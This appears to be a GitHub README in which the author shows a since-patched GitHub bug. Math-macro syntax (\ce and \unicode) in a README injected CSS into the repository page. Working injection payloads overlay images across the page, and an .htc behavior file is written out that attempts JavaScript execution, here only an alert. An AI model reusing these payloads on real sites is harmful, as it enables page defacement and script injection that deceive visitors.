
# GITHUB CSS VULN TEST >_<
![image](https://github.com/tr4xnz/css-vuln/assets/171883047/f068a0ae-8df2-4bbf-9fee-ec912725a884)

The Github CSS Vuln, a vulnerability where README.md macros were exploited to edit the CSS on one's repository's page, and it'll be stored on the server.
This vulnerability's discovery was very surprising as Github is like a huge platform where major companies and developers share their projects and ideas.
Luckily the vulnerability was patched.

I still believed that an XSS attack was possible using CSS's ability to load in .htc files to run Javascript code.

## script.htc
```htc
<PUBLIC:COMPONENT TAGNAME="xss">
  <PUBLIC:ATTACH EVENT="ondocumentready" ONEVENT="main()" LITERALCONTENT="false"/>
</PUBLIC:COMPONENT>
<SCRIPT>
  function main() {
    alert("Welcome to my github repo, ik very cool :P");
  }
</SCRIPT>
```

```diff
Hello i am tr4xnz
```

```math
\ce{$\unicode[goombafont; color:red; z-index: -1; position: fixed; top: 0; left: 0; height: 100%; object-fit: cover; width: 100%; opacity: 0.7; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; left: 0; background-repeat: no-repeat; height: 300px; object-fit: cover; width: 300px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 5vh; background-repeat: no-repeat; height: 280px; object-fit: cover; width: 280px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; left: 0; top: 12vh; background-repeat: no-repeat; height: 280px; object-fit: cover; width: 280px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 0; top: 4vh; background-repeat: no-repeat; height: 252px; object-fit: cover; width: 340px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 2vh; bottom: 0; background-repeat: no-repeat; height: 249px; object-fit: cover; width: 213px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover; behavior:url('script.htc')]{x0000}$}
```
```math
$$\ce{$&#x5C;unicode[goombafont; color:red; pointer-events: none; z-index: -10; position: fixed; top: 0; left: 0; height: 100vh; object-fit: cover; background-size: cover; width: 130vw; opacity: 0.5; background: url('https://user-images.githubusercontent.com/30528167/92789817-e4b53d80-f3b3-11ea-96a4-dad3ea09d237.png?raw=true');]{x0000}$}$$
```
